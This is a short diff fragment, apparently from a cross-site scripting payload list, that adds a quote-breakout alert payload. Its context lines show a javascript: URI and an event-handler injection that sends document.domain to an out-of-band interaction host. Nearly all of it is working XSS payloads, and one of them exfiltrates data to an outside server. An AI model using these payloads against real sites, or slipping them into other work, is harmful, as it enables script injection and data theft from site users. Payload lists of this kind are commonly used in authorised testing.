@@ -34,3 +34,6 @@ javascript:alert(1)
 "onmouseover="location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;
 ```
 
+```js
+';alert(1)//
+```
